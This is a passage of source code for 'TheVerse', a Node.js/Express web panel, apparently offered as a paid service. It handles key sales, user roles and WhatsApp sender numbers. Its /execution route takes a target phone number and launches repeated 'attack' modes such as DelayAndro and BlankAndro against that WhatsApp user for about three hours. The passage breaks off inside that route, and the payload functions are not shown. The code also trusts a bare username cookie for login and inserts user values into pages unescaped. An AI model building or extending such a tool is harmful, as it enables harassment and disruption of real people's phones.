      background: rgba(0, 0, 0, 0.85);
      border: 2px solid var(--primary);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 
        0 0 30px rgba(0, 204, 136, 0.3),
        inset 0 0 30px rgba(0, 204, 136, 0.05);
      backdrop-filter: blur(10px);
      margin-bottom: 30px;
      animation: fadeIn 0.8s ease;
    }
    
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: scale(0.95);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }
    
    .section-title {
      font-family: 'Orbitron', sans-serif;
      color: var(--primary);
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 10px;
      text-shadow: 0 0 10px rgba(0, 204, 136, 0.5);
    }
    
    .section-title i {
      font-size: 20px;
      animation: pulse 2s ease infinite;
    }
    
    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.1);
      }
    }
    
    .tab-buttons {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      border-bottom: 2px solid rgba(0, 204, 136, 0.3);
      padding-bottom: 10px;
    }
    
    .tab-btn {
      background: rgba(0, 204, 136, 0.1);
      border: 2px solid var(--primary);
      border-radius: 10px;
      padding: 10px 20px;
      font-size: 14px;
      color: var(--text);
      cursor: pointer;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .tab-btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(0, 204, 136, 0.3), transparent);
      transition: left 0.5s;
    }
    
    .tab-btn:hover::before {
      left: 100%;
    }
    
    .tab-btn.active {
      background: var(--primary);
      color: var(--dark);
      font-weight: bold;
      box-shadow: 0 0 20px rgba(0, 204, 136, 0.5);
    }
    
    .tab-btn:hover:not(.active) {
      background: rgba(0, 204, 136, 0.2);
      transform: translateY(-2px);
    }
    
    .tab-content {
      display: none;
    }
    
    .tab-content.active {
      display: block;
      animation: fadeIn 0.5s ease;
    }
    
    .add-key-form {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr 1fr;
      gap: 15px;
      margin-bottom: 30px;
    }
    
    .form-group {
      display: flex;
      flex-direction: column;
      gap: 5px;
    }
    
    .form-group label {
      font-size: 14px;
      color: var(--primary);
      font-weight: 600;
    }
    
    .form-group input, .form-group select {
      padding: 12px 15px;
      border-radius: 10px;
      background: rgba(0, 204, 136, 0.05);
      border: 2px solid var(--primary);
      color: var(--text);
      font-size: 14px;
      transition: all 0.3s ease;
    }
    
    .form-group input:focus, .form-group select:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 15px rgba(0, 204, 136, 0.5);
      background: rgba(0, 204, 136, 0.1);
    }
    
    .form-submit {
      background: var(--primary);
      color: var(--dark);
      padding: 12px;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
      font-family: 'Orbitron', sans-serif;
      letter-spacing: 1px;
      text-transform: uppercase;
      grid-column: 1 / -1;
      position: relative;
      overflow: hidden;
    }
    
    .form-submit::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.3);
      transform: translate(-50%, -50%);
      transition: width 0.6s, height 0.6s;
    }
    
    .form-submit:hover::before {
      width: 300px;
      height: 300px;
    }
    
    .form-submit:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(0, 204, 136, 0.6);
    }
    
    .users-table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    
    .users-table th {
      background: rgba(0, 204, 136, 0.2);
      padding: 15px;
      text-align: left;
      font-family: 'Orbitron', sans-serif;
      letter-spacing: 1px;
      border-bottom: 2px solid var(--primary);
      color: var(--primary);
    }
    
    .users-table td {
      padding: 15px;
      border-bottom: 1px solid rgba(0, 204, 136, 0.2);
    }
    
    .users-table tr {
      transition: all 0.3s ease;
    }
    
    .users-table tr:hover {
      background: rgba(0, 204, 136, 0.1);
      transform: scale(1.01);
    }
    
    .role-badge {
      display: inline-block;
      padding: 5px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: bold;
      text-transform: uppercase;
      background: var(--primary);
      color: var(--dark);
      box-shadow: 0 0 10px rgba(0, 204, 136, 0.5);
    }
    
    .owner-badge {
      background: linear-gradient(135deg, #ff00e6, #ff4444);
    }
    
    .admin-badge {
      background: linear-gradient(135deg, #ffaa00, #ff4444);
    }
    
    .moderator-badge {
      background: linear-gradient(135deg, #f2f2f2, #0088ff);
    }
    
    .helper-badge {
      background: linear-gradient(135deg, #00ff7f, #f2f2f2);
    }
    
    .premium-badge {
      background: linear-gradient(135deg, #ff00e6, #0033ff);
    }
    
    .vip-badge {
      background: linear-gradient(135deg, #ffaa00, #ff00e6);
    }
    
    .exclusive-badge {
      background: linear-gradient(135deg, #00ff7f, #ffaa00);
    }
    
    .action-btn {
      background: var(--primary);
      border: none;
      color: var(--dark);
      cursor: pointer;
      margin: 0 5px;
      font-size: 14px;
      padding: 8px 12px;
      border-radius: 8px;
      transition: all 0.3s ease;
      font-weight: 600;
    }
    
    .action-btn:hover {
      transform: scale(1.1);
      box-shadow: 0 5px 15px rgba(0, 204, 136, 0.5);
    }
    
    .delete-btn {
      background: var(--danger);
      color: white;
    }
    
    .delete-btn:hover {
      box-shadow: 0 5px 15px rgba(255, 68, 68, 0.5);
    }
    
    .edit-btn {
      background: var(--warning);
      color: var(--dark);
    }
    
    .edit-btn:hover {
      box-shadow: 0 5px 15px rgba(255, 170, 0, 0.5);
    }
    
    .extend-btn {
      background: var(--success);
      color: var(--dark);
    }
    
    .extend-btn:hover {
      box-shadow: 0 5px 15px rgba(0, 255, 127, 0.5);
    }
    
    .edit-form {
      display: none;
      background: rgba(0, 204, 136, 0.05);
      padding: 20px;
      border-radius: 10px;
      margin-top: 10px;
      border-left: 4px solid var(--primary);
    }
    
    .edit-form-grid {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      gap: 15px;
    }
    
    .edit-form-buttons {
      display: flex;
      justify-content: flex-end;
      gap: 10px;
      margin-top: 15px;
    }
    
    .edit-form-btn {
      padding: 10px 20px;
      border-radius: 8px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .save-btn {
      background: var(--success);
      color: var(--dark);
    }
    
    .save-btn:hover {
      box-shadow: 0 5px 15px rgba(0, 255, 127, 0.5);
      transform: translateY(-2px);
    }
    
    .cancel-btn {
      background: var(--danger);
      color: var(--text);
    }
    
    .cancel-btn:hover {
      box-shadow: 0 5px 15px rgba(255, 68, 68, 0.5);
      transform: translateY(-2px);
    }
    
    .sender-management {
      margin-top: 20px;
    }
    
    .sender-form {
      display: grid;
      grid-template-columns: 1fr auto;
      gap: 15px;
      margin-bottom: 20px;
    }
    
    .sender-form input {
      padding: 12px 15px;
      border-radius: 10px;
      background: rgba(0, 204, 136, 0.05);
      border: 2px solid var(--primary);
      color: var(--text);
      font-size: 14px;
    }
    
    .sender-form button {
      background: var(--primary);
      color: var(--dark);
      padding: 12px 25px;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .sender-form button:hover {
      transform: translateY(-3px);
      box-shadow: 0 5px 20px rgba(0, 204, 136, 0.5);
    }
    
    .sender-list {
      list-style: none;
    }
    
    .sender-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 20px;
      background: rgba(0, 204, 136, 0.05);
      border: 2px solid var(--primary);
      border-radius: 10px;
      margin-bottom: 10px;
      transition: all 0.3s ease;
    }
    
    .sender-item:hover {
      background: rgba(0, 204, 136, 0.1);
      transform: translateX(5px);
    }
    
    .sender-actions {
      display: flex;
      gap: 10px;
    }
    
    .sender-delete-btn {
      background: var(--danger);
      color: white;
      border: none;
      border-radius: 8px;
      padding: 8px 15px;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    
    .sender-delete-btn:hover {
      box-shadow: 0 5px 15px rgba(255, 68, 68, 0.5);
      transform: scale(1.05);
    }
    
    .permission-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
      margin-top: 20px;
    }
    
    .permission-card {
      background: rgba(0, 204, 136, 0.05);
      border-radius: 15px;
      padding: 20px;
      border: 2px solid var(--primary);
      transition: all 0.3s ease;
    }
    
    .permission-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 30px rgba(0, 204, 136, 0.3);
    }
    
    .permission-title {
      font-weight: bold;
      margin-bottom: 15px;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 16px;
    }
    
    .permission-options {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    
    .permission-option {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    
    .permission-label {
      font-size: 14px;
    }
    
    .permission-toggle {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 24px;
    }
    
    .permission-toggle input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    
    .permission-slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #333;
      transition: .4s;
      border-radius: 24px;
    }
    
    .permission-slider:before {
      position: absolute;
      content: "";
      height: 16px;
      width: 16px;
      left: 4px;
      bottom: 4px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }
    
    .permission-toggle input:checked + .permission-slider {
      background-color: var(--primary);
      box-shadow: 0 0 15px rgba(0, 204, 136, 0.5);
    }
    
    .permission-toggle input:checked + .permission-slider:before {
      transform: translateX(26px);
    }
    
    @media (max-width: 1200px) {
      .add-key-form, .edit-form-grid, .permission-grid {
        grid-template-columns: 1fr 1fr;
      }
    }
    
    @media (max-width: 768px) {
      .header {
        flex-direction: column;
        gap: 15px;
        align-items: flex-start;
      }
      
      .nav-buttons {
        width: 100%;
        flex-direction: column;
      }
      
      .nav-btn {
        width: 100%;
        justify-content: center;
      }
      
      .tab-buttons {
        flex-wrap: wrap;
      }
      
      .users-table {
        display: block;
        overflow-x: auto;
      }
      
      .add-key-form, .edit-form-grid, .permission-grid {
        grid-template-columns: 1fr;
      }
      
      .sender-form {
        grid-template-columns: 1fr;
      }
      
      .dashboard-container {
        padding: 15px;
      }
    }
    
    @media (max-width: 480px) {
      body {
        padding: 10px;
      }
      
      .logo {
        width: 50px;
        height: 50px;
      }
      
      .title {
        font-size: 18px;
      }
      
      .action-btn {
        margin: 2px;
        padding: 6px 10px;
        font-size: 12px;
      }
    }
  </style>
</head>
<body>
  <canvas id="atomCanvas"></canvas>
  
  <div class="content-wrapper">
    <div class="header">
      <div class="logo-container">
        <img src="https://cdn.yupra.my.id/yp/qp8d9yfz.jpg" alt="TheVerse Logo" class="logo">
        <h1 class="title">THEVERSE | ${currentUserRole.toUpperCase()} DASHBOARD</h1>
      </div>
      <div class="nav-buttons">
        <a href="/execution" class="nav-btn">
          <i class="fas fa-arrow-left"></i> <span>Back to Panel</span>
        </a>
        <a href="/logout" class="nav-btn">
          <i class="fas fa-sign-out-alt"></i> <span>Logout</span>
        </a>
      </div>
    </div>
    
    <div class="dashboard-container">
      <div class="tab-buttons">
        ${canManageUsers ? '<button class="tab-btn active" data-tab="userManagement">User Management</button>' : ''}
        ${canManageSenders ? '<button class="tab-btn" data-tab="senderManagement">Sender Management</button>' : ''}
        ${currentUserRole === ROLES.OWNER ? '<button class="tab-btn" data-tab="permissionManagement">Permission Management</button>' : ''}
      </div>
      
      ${canManageUsers ? `
      <div id="userManagement" class="tab-content active">
        <h2 class="section-title">
          <i class="fas fa-key"></i> Add New Key
        </h2>
        
        <form id="addKeyForm" class="add-key-form" method="POST" action="/add-key">
          <div class="form-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required>
          </div>
          
          <div class="form-group">
            <label for="key">API Key (auto-generated)</label>
            <input type="text" id="key" name="key" readonly value="${generateKey(4)}">
          </div>
          
          <div class="form-group">
            <label for="duration">Duration</label>
            <input type="number" id="duration" name="duration" min="1" max="365" value="30" required>
          </div>
          
          <div class="form-group">
            <label for="durationUnit">Unit</label>
            <select id="durationUnit" name="durationUnit">
              <option value="minutes">Minutes</option>
              <option value="hours">Hours</option>
              <option value="days" selected>Days</option>
              <option value="months">Months</option>
            </select>
          </div>
          
          <div class="form-group">
            <label for="role">Role</label>
            <select id="role" name="role">
              <option value="owner" ${currentUserRole === ROLES.OWNER ? '' : 'disabled'}>Owner</option>
              <option value="admin">Admin</option>
              <option value="moderator">Moderator</option>
              <option value="helper">Helper</option>
              <option value="premium">Premium</option>
              <option value="vip" selected>VIP</option>
            </select>
          </div>
          
          <button type="submit" class="form-submit">
            <i class="fas fa-plus"></i> ADD KEY
          </button>
        </form>
        
        <h2 class="section-title">
          <i class="fas fa-users"></i> Registered Users (${users.length})
        </h2>
        
        <table class="users-table">
          <thead>
            <tr>
              <th>Username</th>
              <th>API Key</th>
              <th>Role</th>
              <th>Expired</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            ${users.map(user => {
              const expired = new Date(user.expired).toLocaleString("id-ID", {
                timeZone: "Asia/Jakarta",
                year: "2-digit",
                month: "2-digit",
                day: "2-digit",
                hour: "2-digit",
                minute: "2-digit",
              });
              
              return `
              <tr>
                <td>${user.username}</td>
                <td><code>${user.key}</code></td>
                <td><span class="role-badge ${user.role}-badge">${user.role}</span></td>
                <td>${expired}</td>
                <td>
                  <button class="action-btn edit-btn" onclick="showEditForm('${user.username}')">
                    <i class="fas fa-edit"></i> Edit
                  </button>
                  <button class="action-btn extend-btn" onclick="showExtendForm('${user.username}')">
                    <i class="fas fa-clock"></i> Extend
                  </button>
                  <button class="action-btn delete-btn" onclick="deleteUser('${user.username}')">
                    <i class="fas fa-trash"></i> Delete
                  </button>
                </td>
              </tr>
              <tr id="edit-${user.username}" style="display: none;">
                <td colspan="5">
                  <form class="edit-form" onsubmit="updateUser(event, '${user.username}')">
                    <div class="edit-form-grid">
                      <div class="form-group">
                        <label>Username</label>
                        <input type="text" id="edit-username-${user.username}" value="${user.username}" required>
                      </div>
                      <div class="form-group">
                        <label>API Key</label>
                        <input type="text" id="edit-key-${user.username}" value="${user.key}" required>
                      </div>
                      <div class="form-group">
                        <label for="edit-role-${user.username}">Role</label>
                        <select id="edit-role-${user.username}">
                          <option value="owner" ${user.role === 'owner' ? 'selected' : ''} ${currentUserRole === ROLES.OWNER ? '' : 'disabled'}>Owner</option>
                          <option value="admin" ${user.role === 'admin' ? 'selected' : ''}>Admin</option>
                          <option value="moderator" ${user.role === 'moderator' ? 'selected' : ''}>Moderator</option>
                          <option value="helper" ${user.role === 'helper' ? 'selected' : ''}>Helper</option>
                          <option value="premium" ${user.role === 'premium' ? 'selected' : ''}>Premium</option>
                          <option value="vip" ${user.role === 'vip' ? 'selected' : ''}>VIP</option>
                        </select>
                      </div>
                    </div>
                    <div class="edit-form-buttons">
                      <button type="button" class="edit-form-btn cancel-btn" onclick="hideEditForm('${user.username}')">
                        Cancel
                      </button>
                      <button type="submit" class="edit-form-btn save-btn">
                        Save Changes
                      </button>
                    </div>
                  </form>
                </td>
              </tr>
              <tr id="extend-${user.username}" style="display: none;">
                <td colspan="5">
                  <form class="edit-form" onsubmit="extendUser(event, '${user.username}')">
                    <div class="edit-form-grid">
                      <div class="form-group">
                        <label>Username</label>
                        <input type="text" value="${user.username}" disabled>
                      </div>
                      <div class="form-group">
                        <label>Current Expiry</label>
                        <input type="text" value="${expired}" disabled>
                      </div>
                      <div class="form-group">
                        <label for="extend-amount-${user.username}">Extend By</label>
                        <input type="number" id="extend-amount-${user.username}" min="1" max="365" value="30" required>
                      </div>
                      <div class="form-group">
                        <label for="extend-unit-${user.username}">Unit</label>
                        <select id="extend-unit-${user.username}">
                          <option value="minutes">Minutes</option>
                          <option value="hours">Hours</option>
                          <option value="days" selected>Days</option>
                          <option value="months">Months</option>
                        </select>
                      </div>
                    </div>
                    <div class="edit-form-buttons">
                      <button type="button" class="edit-form-btn cancel-btn" onclick="hideExtendForm('${user.username}')">
                        Cancel
                      </button>
                      <button type="submit" class="edit-form-btn save-btn">
                        Extend Expiry
                      </button>
                    </div>
                  </form>
                </td>
              </tr>
              `;
            }).join('')}
          </tbody>
        </table>
      </div>
      ` : ''}
      
      ${canManageSenders ? `
      <div id="senderManagement" class="tab-content">
        <h2 class="section-title">
          <i class="fas fa-paper-plane"></i> Sender Management
        </h2>
        
        <div class="sender-management">
          <form id="connectSenderForm" class="sender-form">
            <input type="text" id="senderNumber" placeholder="628xxxxxxxxxx" required>
            <button type="submit">
              <i class="fas fa-link"></i> Connect
            </button>
          </form>
          
          <h3 class="section-title">
            <i class="fas fa-list"></i> Active Senders (${activeSenders.length})
          </h3>
          
          <ul class="sender-list" id="senderList">
            ${activeSenders.map(sender => `
              <li class="sender-item">
                <span>${sender}</span>
                <div class="sender-actions">
                  <button class="sender-delete-btn" onclick="deleteSender('${sender}')">
                    <i class="fas fa-trash"></i> Delete
                  </button>
                </div>
              </li>
            `).join('')}
          </ul>
        </div>
      </div>
      ` : ''}
      
      ${currentUserRole === ROLES.OWNER ? `
      <div id="permissionManagement" class="tab-content">
        <h2 class="section-title">
          <i class="fas fa-user-shield"></i> Role Permissions
        </h2>
        
        <div class="permission-grid">
          <div class="permission-card">
            <div class="permission-title">
              <i class="fas fa-user-tie"></i> Admin Permissions
            </div>
            <div class="permission-options">
              <div class="permission-option">
                <span class="permission-label">User Management</span>
                <label class="permission-toggle">
                  <input type="checkbox" id="admin-user-management" ${ROLE_PERMISSIONS[ROLES.ADMIN]?.userManagement ? 'checked' : ''}>
                  <span class="permission-slider"></span>
                </label>
              </div>
              <div class="permission-option">
                <span class="permission-label">Sender Management</span>
                <label class="permission-toggle">
                  <input type="checkbox" id="admin-sender-management" ${ROLE_PERMISSIONS[ROLES.ADMIN]?.senderManagement ? 'checked' : ''}>
                  <span class="permission-slider"></span>
                </label>
              </div>
            </div>
          </div>
          
          <div class="permission-card">
            <div class="permission-title">
              <i class="fas fa-user-cog"></i> Moderator Permissions
            </div>
            <div class="permission-options">
              <div class="permission-option">
                <span class="permission-label">User Management</span>
                <label class="permission-toggle">
                  <input type="checkbox" id="moderator-user-management" ${ROLE_PERMISSIONS[ROLES.MODERATOR]?.userManagement ? 'checked' : ''}>
                  <span class="permission-slider"></span>
                </label>
              </div>
              <div class="permission-option">
                <span class="permission-label">Sender Management</span>
                <label class="permission-toggle">
                  <input type="checkbox" id="moderator-sender-management" ${ROLE_PERMISSIONS[ROLES.MODERATOR]?.senderManagement ? 'checked' : ''}>
                  <span class="permission-slider"></span>
                </label>
              </div>
            </div>
          </div>
          
          <div class="permission-card">
            <div class="permission-title">
              <i class="fas fa-user-headset"></i> Helper Permissions
            </div>
            <div class="permission-options">
              <div class="permission-option">
                <span class="permission-label">User Management</span>
                <label class="permission-toggle">
                  <input type="checkbox" id="helper-user-management" ${ROLE_PERMISSIONS[ROLES.HELPER]?.userManagement ? 'checked' : ''}>
                  <span class="permission-slider"></span>
                </label>
              </div>
              <div class="permission-option">
                <span class="permission-label">Sender Management</span>
                <label class="permission-toggle">
                  <input type="checkbox" id="helper-sender-management" ${ROLE_PERMISSIONS[ROLES.HELPER]?.senderManagement ? 'checked' : ''}>
                  <span class="permission-slider"></span>
                </label>
              </div>
            </div>
          </div>
        </div>
      </div>
      ` : ''}
    </div>
  </div>

  <script>
    // Atom Animation Canvas
    const canvas = document.getElementById('atomCanvas');
    const ctx = canvas.getContext('2d');
    
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    window.addEventListener('resize', () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    });
    
    class Atom {
      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.size = Math.random() * 3 + 1;
        this.speedX = Math.random() * 1 - 0.5;
        this.speedY = Math.random() * 1 - 0.5;
        this.opacity = Math.random() * 0.5 + 0.2;
      }
      
      update() {
        this.x += this.speedX;
        this.y += this.speedY;
        
        if (this.x > canvas.width) this.x = 0;
        if (this.x < 0) this.x = canvas.width;
        if (this.y > canvas.height) this.y = 0;
        if (this.y < 0) this.y = canvas.height;
      }
      
      draw() {
        ctx.fillStyle = 'rgba(0, 204, 136, ' + this.opacity + ')';
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
      }
    }
    
    const atoms = [];
    for (let i = 0; i < 100; i++) {
      atoms.push(new Atom());
    }
    
    function animateAtoms() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      for (let i = 0; i < atoms.length; i++) {
        atoms[i].update();
        atoms[i].draw();
        
        for (let j = i + 1; j < atoms.length; j++) {
          const dx = atoms[i].x - atoms[j].x;
          const dy = atoms[i].y - atoms[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          
          if (dist < 100) {
            ctx.strokeStyle = 'rgba(0, 204, 136, ' + (0.1 * (1 - dist / 100)) + ')';
            ctx.lineWidth = 1;
            ctx.beginPath();
            ctx.moveTo(atoms[i].x, atoms[i].y);
            ctx.lineTo(atoms[j].x, atoms[j].y);
            ctx.stroke();
          }
        }
      }
      
      requestAnimationFrame(animateAtoms);
    }
    
    animateAtoms();
    
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
      });
    });
    
    // User Management Functions
    function showEditForm(username) {
      document.querySelectorAll('[id^="edit-"]').forEach(el => el.style.display = 'none');
      document.querySelectorAll('[id^="extend-"]').forEach(el => el.style.display = 'none');
      document.getElementById('edit-' + username).style.display = 'table-row';
    }
    
    function hideEditForm(username) {
      document.getElementById('edit-' + username).style.display = 'none';
    }
    
    function showExtendForm(username) {
      document.querySelectorAll('[id^="edit-"]').forEach(el => el.style.display = 'none');
      document.querySelectorAll('[id^="extend-"]').forEach(el => el.style.display = 'none');
      document.getElementById('extend-' + username).style.display = 'table-row';
    }
    
    function hideExtendForm(username) {
      document.getElementById('extend-' + username).style.display = 'none';
    }
    
    function updateUser(e, oldUsername) {
      e.preventDefault();
      const username = document.getElementById('edit-username-' + oldUsername).value;
      const key = document.getElementById('edit-key-' + oldUsername).value;
      const role = document.getElementById('edit-role-' + oldUsername).value;
      
      fetch('/edit-key', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          oldUsername,
          username,
          key,
          role
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('User updated successfully!');
          location.reload();
        } else {
          alert('Error: ' + data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while updating the user.');
      });
    }
    
    function extendUser(e, username) {
      e.preventDefault();
      const amount = document.getElementById('extend-amount-' + username).value;
      const unit = document.getElementById('extend-unit-' + username).value;
      
      fetch('/extend-key', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          amount,
          unit
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('User expiry extended successfully!');
          location.reload();
        } else {
          alert('Error: ' + data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while extending the user expiry.');
      });
    }
    
    function deleteUser(username) {
      if (confirm('Are you sure you want to delete user ' + username + '?')) {
        fetch('/delete-key', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ username })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            alert('User deleted successfully!');
            location.reload();
          } else {
            alert('Error: ' + data.message);
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('An error occurred while deleting the user.');
        });
      }
    }
    
    // Sender Management Functions
    document.getElementById('connectSenderForm')?.addEventListener('submit', function(e) {
      e.preventDefault();
      const number = document.getElementById('senderNumber').value;
      
      if (!number) {
        alert('Please enter a valid number');
        return;
      }
      
      fetch('/connect-sender', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ number })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('Sender connected successfully!');
          location.reload();
        } else {
          alert('Error: ' + data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while connecting the sender.');
      });
    });
    
    function deleteSender(number) {
      if (confirm('Are you sure you want to delete sender ' + number + '?')) {
        fetch('/delete-sender', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ number })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            alert('Sender deleted successfully!');
            location.reload();
          } else {
            alert('Error: ' + data.message);
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('An error occurred while deleting the sender.');
        });
      }
    }
    
    // Permission Management Functions
    document.getElementById('admin-user-management')?.addEventListener('change', function() {
      updatePermission('admin', 'userManagement', this.checked);
    });
    
    document.getElementById('admin-sender-management')?.addEventListener('change', function() {
      updatePermission('admin', 'senderManagement', this.checked);
    });
    
    document.getElementById('moderator-user-management')?.addEventListener('change', function() {
      updatePermission('moderator', 'userManagement', this.checked);
    });
    
    document.getElementById('moderator-sender-management')?.addEventListener('change', function() {
      updatePermission('moderator', 'senderManagement', this.checked);
    });
    
    document.getElementById('helper-user-management')?.addEventListener('change', function() {
      updatePermission('helper', 'userManagement', this.checked);
    });
    
    document.getElementById('helper-sender-management')?.addEventListener('change', function() {
      updatePermission('helper', 'senderManagement', this.checked);
    });
    
    function updatePermission(role, permission, enabled) {
      fetch('/update-permission', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          role,
          permission,
          enabled
        })
      })
      .then(response => response.json())
      .then(data => {
        if (!data.success) {
          alert('Error updating permission: ' + data.message);
          document.getElementById(role + '-' + permission).checked = !enabled;
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while updating the permission.');
        document.getElementById(role + '-' + permission).checked = !enabled;
      });
    }
    
    // Handle add key form submission
    document.getElementById('addKeyForm')?.addEventListener('submit', (e) => {
      e.preventDefault();
      
      const formData = new FormData(e.target);
      const params = new URLSearchParams(formData);
      
      fetch('/add-key', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: params
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('Key added successfully!');
          location.reload();
        } else {
          alert('Error: ' + data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while adding the key.');
      });
    });
  </script>
</body>
</html>`;
};

// Routes
app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) {
    return res.send(mainPageHTML(false));
  }
  
  const users = getUsers();
  const user = users.find(u => u.username === username);
  
  if (!user || !user.expired || Date.now() > user.expired) {
    res.clearCookie("sessionUser");
    return res.send(mainPageHTML(false, '', '', "Your session has expired"));
  }
  
  if (user.role === ROLES.OWNER || hasManagementPermission(user.role, 'userManagement')) {
    return res.redirect("/dashboard");
  }
  
  res.redirect("/execution");
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  res.send(mainPageHTML(false, '', '', msg));
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  if (Date.now() > user.expired) {
    return res.redirect("/login?msg=" + encodeURIComponent("Key sudah expired!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  
  if (user.role === ROLES.OWNER || hasManagementPermission(user.role, 'userManagement')) {
    return res.redirect("/dashboard");
  }
  
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";

  if (!username) {
    return res.redirect("/login");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user || !user.expired || Date.now() > user.expired) {
    res.clearCookie("sessionUser");
    return res.redirect("/login?msg=" + encodeURIComponent("Your session has expired"));
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = `${targetNumber}@s.whatsapp.net`;

  if (sessions.size === 0) {
    return res.send(executionPageHTML(user, mode, targetNumber, "❌ Sender Offline..."));
  }

  if (!targetNumber) {
    if (!mode) {
      return res.send(executionPageHTML(user, '', '', "Pilih mode yang ingin digunakan."));
    }

    if (["ph4ntom", "extr4vaz", "sl4yerz", "ex4ltedz", "w4nnacry"].includes(mode)) {
      return res.send(executionPageHTML(user, mode, '', "Masukkan nomor target (62xxxxxxxxxx)."));
    }

    return res.send(executionPageHTML(user, '', '', "❌ Mode tidak dikenali."));
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.send(executionPageHTML(user, mode, targetNumber, "❌ Format salah. Nomor harus hanya angka dan diawali dengan nomor negara"));
  }

  try {
    // ✅ SELALU GUNAKAN count = 30 → duration = 3 jam
    const totalAttacks = 30; // 30 attacks / 10 per hour = 3 hours

    // Check if user has permission for this attack mode
    if (mode && ATTACK_REQUIREMENTS[mode] && !hasPermission(user.role, ATTACK_REQUIREMENTS[mode])) {
      return res.send(executionPageHTML(user, mode, targetNumber, `❌ Anda tidak memiliki izin untuk menggunakan mode ${mode}. Diperlukan role: ${ATTACK_REQUIREMENTS[mode]}`));
    }
    
    // Execute appropriate attack based on mode
    switch(mode) {
      case "ph4ntom":
        DelayAndro(totalAttacks, target);
        break;
      case "extr4vaz":
        BlankAndro(totalAttacks, target);
        break;
      case "sl4yerz":
